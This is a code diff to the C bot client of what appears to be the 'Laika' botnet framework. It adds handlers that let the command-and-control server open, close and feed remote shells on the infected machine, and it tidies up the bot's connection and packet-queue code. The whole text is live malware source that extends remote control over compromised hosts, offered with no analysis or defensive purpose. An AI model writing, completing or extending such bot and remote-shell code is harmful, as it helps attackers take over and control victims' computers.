@@ -2,12 +2,15 @@
 #include "lrsa.h"
 #include "lerror.h"
 #include "bot.h"
+#include "shell.h"
 
 LAIKAPKT_SIZE laikaB_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t)
+    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t),
+    [LAIKAPKT_SHELL_OPEN] = sizeof(uint8_t),
+    [LAIKAPKT_SHELL_CLOSE] = sizeof(uint8_t),
 };
 
-void handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+void laikaB_handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_bot *bot = (struct sLaika_bot*)uData;
     uint8_t endianness = laikaS_readByte(&peer->sock);
 
@@ -16,7 +19,10 @@ void handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
 }
 
 PeerPktHandler laikaB_handlerTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_RES] = handleHandshakeResponse
+    [LAIKAPKT_HANDSHAKE_RES] = laikaB_handleHandshakeResponse,
+    [LAIKAPKT_SHELL_OPEN] = laikaB_handleShellOpen,
+    [LAIKAPKT_SHELL_CLOSE] = laikaB_handleShellClose,
+    [LAIKAPKT_SHELL_DATA] = laikaB_handleShellData,
 };
 
 struct sLaika_bot *laikaB_newBot(void) {
@@ -24,6 +30,8 @@ struct sLaika_bot *laikaB_newBot(void) {
     struct hostent *host;
     char *tempIPBuf;
     size_t _unused;
+
+    memset(bot->shells, 0, sizeof(bot->shells));
 
     laikaP_initPList(&bot->pList);
     bot->peer = laikaS_newPeer(
@@ -72,8 +80,17 @@ struct sLaika_bot *laikaB_newBot(void) {
 }
 
 void laikaB_freeBot(struct sLaika_bot *bot) {
+    int i;
+
     laikaP_cleanPList(&bot->pList);
     laikaS_freePeer(bot->peer);
+
+    /* clear shells */
+    for (i = 0; i < LAIKA_MAX_SHELLS; i++) {
+        if (bot->shells[i])
+            laikaB_freeShell(bot, bot->shells[i]);
+    }
+
     laikaM_free(bot);
 }
 
@@ -104,10 +121,21 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
         LAIKA_ERROR("failed to send handshake request!\n")
 }
 
+void laikaB_flushQueue(struct sLaika_bot *bot) {
+    /* flush pList's outQueue */
+    if (bot->pList.outCount > 0) {
+        if (!laikaS_handlePeerOut(bot->peer))
+            laikaS_kill(&bot->peer->sock);
+
+        laikaP_resetOutQueue(&bot->pList);
+    }
+}
+
 bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
     struct sLaika_pollEvent *evnt;
     int numEvents;
 
+    laikaB_flushQueue(bot);
     evnt = laikaP_poll(&bot->pList, timeout, &numEvents);
 
     if (numEvents == 0) /* no events? timeout was reached */
@@ -127,13 +155,6 @@ _BOTKILL:
     laikaS_kill(&bot->peer->sock);
 LAIKA_TRYEND
 
-    /* flush pList's outQueue */
-    if (bot->pList.outCount > 0) {
-        if (!laikaS_handlePeerOut(bot->peer))
-            laikaS_kill(&bot->peer->sock);
-
-        laikaP_resetOutQueue(&bot->pList);
-    }
-
+    laikaB_flushQueue(bot);
     return true;
 }
